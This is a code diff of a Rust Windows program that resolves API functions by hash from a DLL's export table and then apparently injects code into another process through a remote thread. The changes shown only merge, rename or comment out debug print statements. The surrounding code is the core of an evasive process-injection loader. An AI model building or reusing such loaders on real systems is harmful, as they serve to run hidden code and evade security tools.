@@ -97,45 +97,37 @@ fn getFuncAddressByHash(lib: &str, hash: Vec<u32>) -> Vec<Option<*const u32>> {
     unsafe {
 
         let lib_ptr: PCSTR = PCSTR::from_raw(format!("{}\0", lib).as_ptr());
-
         let libBase: Result<HMODULE> = LoadLibraryA(lib_ptr);
-
         let mut funcAddresses: Vec<Option<*const u32>> = vec![None; hash.len()];
          
         match libBase {
             Ok(h) => {
-                println!("\n");
                 let base_ptr: *const u8 = h.0 as *const u8;
-                println!("[+] Module Handle: {:?}", base_ptr);
-                
                 let img_dos_header: &IMAGE_DOS_HEADER = &*(base_ptr as *const IMAGE_DOS_HEADER);
-
                 let nt_headers_addr = base_ptr.add(img_dos_header.e_lfanew as usize);
-                println!("[i] IMG_NT_HEADER address: {:?}", nt_headers_addr);
-
                 let img_nt_headers: &IMAGE_NT_HEADERS64 = &*(nt_headers_addr as *const IMAGE_NT_HEADERS64);
-                //println!("{:?}", img_nt_headers);
-
                 let export_directory_RVA: *const u32 = img_nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT.0 as usize].VirtualAddress as *const u32;
-                println!("[i] export directory RVA address: {:?}", export_directory_RVA);
-
                 let export_directory_addr = base_ptr.add(export_directory_RVA as usize);
-                println!("[i] export directory address: {:?}", export_directory_addr);
-
                 let img_export_directory: &IMAGE_EXPORT_DIRECTORY = &*(export_directory_addr as *const IMAGE_EXPORT_DIRECTORY);
-                //println!("{:?}", img_export_directory);
-
                 let addr_func_RVA: *const u32 = base_ptr.add(img_export_directory.AddressOfFunctions as usize) as *const u32;
-                println!("[i] address of function RVA : {:?}", addr_func_RVA);
-
                 let addr_names_RVA: *const u32 = base_ptr.add(img_export_directory.AddressOfNames as usize) as *const u32;
-                println!("[i] address of names RVA : {:?}", addr_names_RVA);
-
                 let addr_names_ordinals_RVA: *const u16 = base_ptr.add(img_export_directory.AddressOfNameOrdinals as usize) as *const u16;
-                println!("[i] address of names ordinals RVA : {:?}", addr_names_ordinals_RVA);
-
                 let f_num: isize = img_export_directory.NumberOfFunctions as isize;
-                println!("[i] Number of functions : {:?}", f_num);
+                
+                println!(
+                    
+                    "
+[+] Module Handle: {:?}
+
+[i] IMG_NT_HEADER address: {:?}
+[i] Export directory RVA address: {:?}
+[i] Export directory address: {:?}
+[i] Address of function RVA : {:?}
+[i] Address of names RVA : {:?}
+[i] Address of names ordinals RVA : {:?}
+[i] Number of functions : {:?}
+                    ", base_ptr, nt_headers_addr, export_directory_RVA, export_directory_addr, addr_func_RVA, addr_names_RVA, addr_names_ordinals_RVA, f_num
+                );
 
                 for i in 0..f_num {
                     let func_name_RVA: u32 = *addr_names_RVA.offset(i as isize) as u32;
@@ -158,7 +150,7 @@ fn getFuncAddressByHash(lib: &str, hash: Vec<u32>) -> Vec<Option<*const u32>> {
                         //println!("{:?} {:#x} {:#x} {:#x}", addr_names_ordinals_RVA.offset(i as isize), *addr_names_ordinals_RVA.offset(i as isize), addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32, *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32);
                         let func_addr_RVA: u32 = *addr_func_RVA.offset(*addr_names_ordinals_RVA.offset(i as isize) as isize) as u32;
                         let func_addr: *const u32 = base_ptr.add(func_addr_RVA as usize) as *const u32;
-                        println!("[i] address of {} : {:?} / RVA : {:?}", func_name_str, func_addr, func_addr_RVA);
+                        println!("[i] Address of {} : {:?} / RVA : {:?}", func_name_str, func_addr, func_addr_RVA);
 
                         funcAddresses[pos] = Some(func_addr);
                     }
@@ -281,7 +273,7 @@ fn main() {
             &mut oldprotect,
         );
         
-        println!("\n[+] Creating a Remote Thread");
+        // println!("\n[+] Creating a Remote Thread");
         
         
         //println!("Last Error : {:?}", GetLastError());
@@ -324,7 +316,7 @@ fn main() {
         println!("[i] Closed process handle");
 
         let _ = XVirtualFree(haddr, 0, MEM_RELEASE);
-        println!("[i] Memory released");
+        //println!("[i] Memory released");
 
 
         println!("[+] Executed!");
